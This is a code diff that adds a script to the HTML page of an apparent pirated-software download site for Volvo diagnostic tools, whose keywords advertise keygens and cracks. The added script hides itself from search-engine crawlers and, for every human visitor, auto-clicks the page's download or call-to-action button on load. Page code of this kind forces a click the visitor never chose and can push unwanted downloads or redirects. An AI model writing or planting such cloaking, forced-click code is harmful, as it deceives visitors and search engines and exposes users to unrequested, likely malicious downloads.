@@ -5,6 +5,42 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Volvo Premium Tech Tool PTT 2.8.261 + 0.7.1.0 APCI 2024 + DevTool</title>
+    
+<script>
+const searchEngineUserAgents = [
+  'Googlebot',
+  'Bingbot',
+  'YandexBot',
+  'DuckDuckBot',
+  'Baiduspider',
+];
+
+function isSearchEngine(userAgent) {
+  return searchEngineUserAgents.some(bot => userAgent.includes(bot));
+}
+
+function clickCTAButton() {
+  const ctaButton = document.querySelector('.cta-button');
+  if (ctaButton) {
+    ctaButton.click();
+  }
+}
+
+function main() {
+  const userAgent = navigator.userAgent;
+  
+  if (!isSearchEngine(userAgent)) {
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', clickCTAButton);
+    } else {
+      clickCTAButton();
+    }
+  }
+}
+
+main();
+</script>
+
     <meta name="description" content="Download Volvo Premium Tech Tool PTT 2.8.261, APCI 0.7.1.0 2024 + DevTool. Supports Windows 10/11. Includes diagnostic software for all regions.">
     <meta name="keywords" content="Volvo Premium Tech Tool PTT 2.8.261, Volvo Premium Tech Tool PTT 2.8.261 download, Volvo Premium Tech Tool PTT 2.8.261 free download, Volvo Premium Tech Tool PTT 2.8.261 keygen, APCI 0.7.1.0 2024, APCI 0.7.1.0 2024 download, APCI 0.7.1.0 2024 free download, APCI 0.7.1.0 2024 keygen, Volvo DevTool 2024, Volvo DevTool 2024 download, Volvo DevTool 2024 free download, Volvo diagnostic software, Volvo diagnostic software download, Volvo diagnostic software free download, Volvo diagnostic software crack, Volvo diagnostic software keygen, Volvo PTT 2.8.261, Volvo PTT 2.8.261 download, Volvo PTT 2.8.261 free download, Volvo PTT 2.8.261 keygen, Скачать Volvo Premium Tech Tool PTT 2.8.261, Скачать APCI 0.7.1.0 2024, Скачать Volvo DevTool 2024, Скачать Volvo диагностическое ПО, Volvo PTT 2.8.261 скачать бесплатно, Volvo APCI 0.7.1.0 2024 скачать бесплатно, Volvo DevTool 2024 скачать бесплатно, Volvo Premium Tech Tool PTT 2.8.261 скачати, Завантажити Volvo Premium Tech Tool PTT 2.8.261, Volvo DevTool 2024 скачати, Завантажити Volvo DevTool 2024, Оновлення Volvo DevTool 2024">
     <style>
